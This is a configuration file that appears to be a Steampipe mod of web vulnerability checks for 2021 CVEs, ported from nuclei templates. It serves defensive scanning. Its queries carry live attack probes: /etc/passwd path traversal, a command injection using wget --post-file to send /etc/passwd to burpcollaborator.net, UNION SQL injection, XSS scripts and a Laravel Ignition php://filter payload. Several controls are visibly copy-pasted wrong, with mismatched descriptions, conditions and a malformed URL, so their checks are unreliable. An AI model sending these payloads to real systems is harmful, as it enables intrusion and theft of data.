variable "base_url" {
  type    = string
  default = "https://steampipe.io"
}

benchmark "cve" {
  title = "CVE"
  children = [
    benchmark.cve_2021,
  ]
}

benchmark "cve_2021" {
  title = "2021"
  children = [
    # control.cve_2021_1234,
    control.cve_2021_21234,
    control.cve_2021_21315,
    control.cve_2021_37216,
    control.cve_2021_37538,
    control.cve_2021_37573,
    control.cve_2021_37704,
    control.cve_2021_38702,
    control.cve_2021_38751,
    control.cve_2021_3129
  ]
}

query "cve_2021_1234" {
  title       = "CVE-2021-1234 Test check"
  description = "This is a test"

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when status_code = 200 then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1
  EOQ
}

control "cve_2021_1234" {
  title       = "CVE-2021-1234 Test check"
  description = "This is a test"

  tags = {
    source    = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-21315.yaml"
    author    = "pikpikcu"
    reference = "https://blogg.pwc.no/styringogkontroll/unauthenticated-directory-traversal-vulnerability-in-a-java-spring-boot-actuator-library-cve-2021-21234"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when status_code = 200 then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1
  EOQ
}

control "cve_2021_21234" {
  title    = "CVE-2021-21234 Spring Boot Actuator Logview - Directory Traversal"
  severity = "high"

  tags = {
    source    = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-21234.yaml"
    author    = "gy741"
    reference = "https://blogg.pwc.no/styringogkontroll/unauthenticated-directory-traversal-vulnerability-in-a-java-spring-boot-actuator-library-cve-2021-21234"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when body ~ 'root:[x*]:0:0' and status_code = 200 then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1 || '/log/view?filename=/etc/passwd&base=../../'
  EOQ
}

control "cve_2021_21315" {
  title       = "CVE-2021-21315 Node.js Systeminformation Command Injection"
  description = "The System Information Library for Node.JS (npm package 'systeminformation') is an open source collection of functions to retrieve detailed hardware, system and OS information. In systeminformation before version 5.3.1 there is a command injection vulnerability. Problem was fixed in version 5.3.1. As a workaround instead of upgrading, be sure to check or sanitize service parameters that are passed to si.inetLatency(), si.inetChecksite(), si.services(), si.processLoad() ... do only allow strings, reject any arrays. String sanitation works as expected."
  severity    = "high"

  tags = {
    source    = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-21315.yaml"
    author    = "pikpikcu"
    reference = "https://blogg.pwc.no/styringogkontroll/unauthenticated-directory-traversal-vulnerability-in-a-java-spring-boot-actuator-library-cve-2021-21234"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          headers::text like '%application/json%'
          and body like '%wget --post-file /etc/passwd burpcollaborator.net%'
          and body like '%name%'
          and body like '%running%'
          and body like '%pids%'
          and status_code = 200
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1 || '/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20burpcollaborator.net)'
  EOQ
}

control "cve_2021_36380" {
  title       = "CVE-2021-36380 Sunhillo SureLine - Unauthenticated OS Command Injection"
  description = <<-EOI
    The /cgi/networkDiag.cgi script directly incorporated user-controllable
    parameters within a shell command, allowing an attacker to manipulate
    the resulting command by injecting valid OS command input. The following
    POST request injects a new command that instructs the server to establish
    a reverse TCP connection to another system, allowing the establishment of
    an interactive remote shell session.
    EOI
  severity    = "medium"

  tags = {
    source         = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-36380.yaml"
    author         = "gy741"
    "cvss-metrics" = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    "cvss-score"   = "9.80"
    "cve-id"       = "CVE-2021-36380"
    "cwe-id"       = "CWE-78"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          body like '%c5fe25896e49ddfe996db7508cf00534%'
          and status_code = 200
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1 || '/cgi/networkDiag.cgi'
      and input = '{"headers": {"X-Trigger-XSS": "<script>alert(1)</script>"}}'
  EOQ
}

control "cve_2021_37216" {
  title       = "CVE-2021-37216 QSAN Storage Manager prior to v3.3.3 Reflected XSS"
  description = <<-EOI
    QSAN Storage Manager header page parameters does not filter special characters.
    Remote attackers can inject JavaScript without logging in and launch
    reflected XSS attacks to access and modify specific data.
    EOI
  severity    = "medium"

  tags = {
    source         = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-37216.yaml"
    author         = "dwisiswant0"
    "cvss-metrics" = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    "cvss-score"   = "6.10"
    "cve-id"       = "CVE-2021-37216"
    "cwe-id"       = "CWE-79"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          body like '%c5fe25896e49ddfe996db7508cf00534%'
          and status_code = 200
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1 || '/http_header.php'
      and input = '{"headers": {"X-Trigger-XSS": "<script>alert(1)</script>"}}'
  EOQ
}

control "cve_2021_37538" {
  title       = "CVE-2021-37538 PrestaShop SmartBlog SQL Injection"
  description = <<-EOI
    PrestaShop SmartBlog by SmartDataSoft < 4.0.6 is vulnerable to a SQL
    injection in the blog archive functionality.
    EOI
  severity    = "critical"

  tags = {
    source         = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-37538.yaml"
    author         = "whoever"
    "cvss-metrics" = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    "cvss-score"   = "9.80"
    "cve-id"       = "CVE-2021-37538"
    "cwe-id"       = "CWE-89"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          body like '%c5fe25896e49ddfe996db7508cf00534%'
          and status_code = 200
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1 || '/module/smartblog/archive?month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-'
  EOQ
}

control "cve_2021_37573" {
  title       = "CVE-2021-37573 Tiny Java Web Server - Reflected XSS"
  description = <<-EOI
    A reflected cross-site scripting (XSS) vulnerability in the web server Tiny
    Java Web Server and Servlet Container (TJWS) <=1.115 allows an adversary to
    inject malicious code on the server's \"404 Page not Found\" error page.
    EOI
  severity    = "medium"

  tags = {
    source         = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-37573.yaml"
    author         = "geeknik"
    "cvss-metrics" = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    "cvss-score"   = "6.10"
    "cve-id"       = "CVE-2021-37573"
    "cwe-id"       = "CWE-79"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          headers::text like '%text/html%'
          and body like '%<H2>404 te<img src=x onerror=alert(42)>st not found</H2>%'
          and body ~ '>PHP Version <\/td><td class="v">([0-9.]+)'
          and status_code = 404
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1 || '/te%3Cimg%20src=x%20onerror=alert(42)%3Est'
  EOQ
}

control "cve_2021_37704" {
  title       = "CVE-2021-37704 phpfastcache phpinfo exposure"
  description = <<-EOI
    phpinfo() exposure in unprotected composer vendor folder via phpfastcache/phpfastcache.
    EOI
  severity    = "medium"

  tags = {
    source         = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-37704.yaml"
    author         = "whoever"
    "cvss-metrics" = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
    "cvss-score"   = "4.30"
    "cve-id"       = "CVE-2021-37704"
    "cwe-id"       = "CWE-668"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          body like '%PHP Extension%'
          and body like '%PHP Version%'
          and body ~ '>PHP Version <\/td><td class="v">([0-9.]+)'
          and status_code = 200
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url in ($1 || '/vendor/phpfastcache/phpfastcache/docs/examples/phpinfo.php', $1 || '/vendor/phpfastcache/phpfastcache/examples/phpinfo.php')
  EOQ
}

control "cve_2021_38702" {
  title       = "CVE-2021-38702 Cyberoam NetGenie XSS"
  description = <<-EOI
    Cyberoam NetGenie C0101B1-20141120-NG11VO devices through 2021-08-14 allow
    for reflected Cross Site Scripting via the 'u' parameter of ft.php.
    EOI
  severity    = "medium"

  tags = {
    source         = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-38702.yaml"
    author         = "geeknik"
    "cvss-metrics" = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    "cvss-score"   = "6.10"
    "cve-id"       = "CVE-2021-38702"
    "cwe-id"       = "CWE-79"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          headers::text like '%text/html%'
          and body like '%</script><script>alert(document.domain)</script>%'
          and status_code = 200
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1 || '/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
  EOQ
}

control "cve_2021_38751" {
  title       = "CVE-2021-38751 ExponentCMS <= 2.6 Host Header Injection"
  description = <<-EOI
    hpinfo() exposure in unprotected composer vendor folder via phpfastcache/phpfastcache.
    EOI
  severity    = "medium"

  tags = {
    source         = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-38751.yaml"
    author         = "dwisiswant0"
    "cvss-metrics" = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
    "cvss-score"   = "4.30"
    "cve-id"       = "CVE-2021-38751"
    "cwe-id"       = "CWE-116"
  }

  param "base_url" {
    default = var.base_url
  }

  // TODO - is this the best way?
  param "randstr" {
    default = "laisdjfowencs"
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          body like '%' || $2 || '%'
          and body like '%EXPONENT.PATH%'
          and body like '%EXPONENT.URL%'
          and status_code = 200
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'GET'
      and url = $1
      and input = '{"headers": {"Host": "' || $2 || '.tld"}}'
      -- TODO - how to pass in?
      -- and request_header_host = $2 || '.tld'
  EOQ
}

control "cve_2021_3129" {
  title       = "CVE-2021-3129 Laravel <= v8.4.2 Debug Mode - Remote Code Execution"
  description = <<-EOI
    Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to
    execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is
    exploitable on sites using debug mode with Laravel before 8.4.2.
    EOI
  severity    = "critical"

  tags = {
    source         = "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-3129.yaml"
    author         = "z3bd,pdteam"
    "cvss-metrics" = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    "cvss-score"   = "9.80"
    "cve-id"       = "CVE-2021-3129"
  }

  param "base_url" {
    default = var.base_url
  }

  sql = <<EOQ
    select
      method || ' ' || url as resource,
      case
        when error is not null then 'error'
        when
          body like '%uid=%'
          and body like '%gid=%'
          and body like '%groups=%'
          and body like '%Illuminate%'
          and body like '%EXPONENT.URL%'
          and status_code = 500
        then 'alarm'
        else 'ok'
      end as status,
      coalesce(error, $1 || ' returned ' || status_code || '.') as reason
    from
      web_request
    where
      method = 'POST'
      and url = $1 || '/_ignition/execute-solution HTTP/1.1'
      and request_header_content_type = 'application/json'
      and input = '{"headers": {"Accept": "application/json"}}'
      and request_body = '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "cve20213129", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}'
  EOQ
}


